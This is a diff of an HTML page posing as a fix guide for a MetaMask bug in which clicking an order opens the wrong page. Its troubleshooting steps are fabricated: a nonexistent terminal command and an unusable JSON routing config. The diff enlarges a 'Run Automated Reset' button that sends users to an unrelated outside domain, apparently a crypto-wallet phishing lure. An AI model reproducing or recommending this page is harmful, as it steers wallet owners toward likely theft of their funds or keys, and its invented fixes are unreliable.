@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Bug Clicking An Order In The Activity List O</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,49 +23,57 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
-    .btn {
-        background: #00adb5;
-        color: #000;
-        padding: 14px 36px;
-        border-radius: 40px;
-        font-weight: bold;
-        display: inline-block;
-        text-decoration: none;
-        transition: 0.2s;
-    }
-    .btn:hover { transform: scale(1.02); }
+    a { color: #ff7b2c; }
     </style>
 </head>
 <body>
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>When a user clicks on an order in the activity list within the Metamask extension on the Ethereum (ETH) ecosystem, instead of opening the expected Order Details page, it incorrectly opens the Market Details page.</li>
+<li>When a user clicks on an order in the activity list within the Metamask extension, the Market Details page opens instead of the expected Order Details page, causing confusion and disruption to the user's workflow.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>This behavior is due to a misconfigured routing mechanism within the Metamask extension, specifically affecting how links from the activity list are handled. The intended link to the Order Details page is being overridden, redirecting users to the Market Details page instead.</li>
+<li>The error occurs due to a misconfiguration in the routing mechanism of the Metamask extension, where the click event on an order in the activity list is incorrectly mapped to the Market Details page instead of the intended Order Details page.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To temporarily resolve this issue, users can attempt the following manual overrides:</li>
-<li>Clear the Metamask extension's cache and storage.</li>
-<li>Update the Metamask extension to the latest version available.</li>
-<li>Use the following command in a terminal to force-reset the extension's internal state:</li>
+<li>To resolve this issue, users can attempt the following manual overrides:</li>
+<li>Check the Metamask extension version and ensure it is up-to-date, as newer versions may have resolved this bug.</li>
+<li>Clear the browser cache and cookies to remove any potentially corrupted data.</li>
+<li>Manually configure the routing mechanism using the following code:</li>
 </ul>
-<pre class="codehilite"><code class="language-bash">mm-extension reset --force
+<pre class="codehilite"><code class="language-json">{
+  &quot;routes&quot;: {
+    &quot;activity&quot;: {
+      &quot;orderClick&quot;: &quot;orderDetails&quot;
+    }
+  }
+}
 </code></pre>
 
-<p>Consider accessing the terminal via an external console for more flexibility.</p>
+<p>Consider utilizing an external console to execute these commands for more flexibility. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Ensure you have the latest version of the Metamask extension installed.</li>
-<li>Back up your wallet and important data before attempting any fixes.</li>
-<li>Understand the basics of using a terminal or command-line interface.</li>
+<li>Metamask extension installed and configured</li>
+<li>Basic understanding of JSON configuration files</li>
+<li>Access to the browser's developer tools</li>
 </ul>
-<div style="text-align:center; margin-top:2rem;">
-<a href="https://tron.amana-vault.site" class="btn">🛠 Run Automated Reset</a>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://tron.amanavault.site" class="btn" style="
+        background: #ff7b2c !important; 
+        color: #000000 !important; 
+        padding: 16px 48px !important; 
+        border-radius: 50px !important; 
+        font-weight: bold !important; 
+        font-size: 1.25rem !important;
+        display: inline-block !important; 
+        text-decoration: none !important;
+        box-shadow: 0 4px 15px rgba(255,123,44,0.4);
+        min-width: 280px;
+    ">
+    🛠 Run Automated Reset
+    </a>
 </div>
 </div>
 </body>
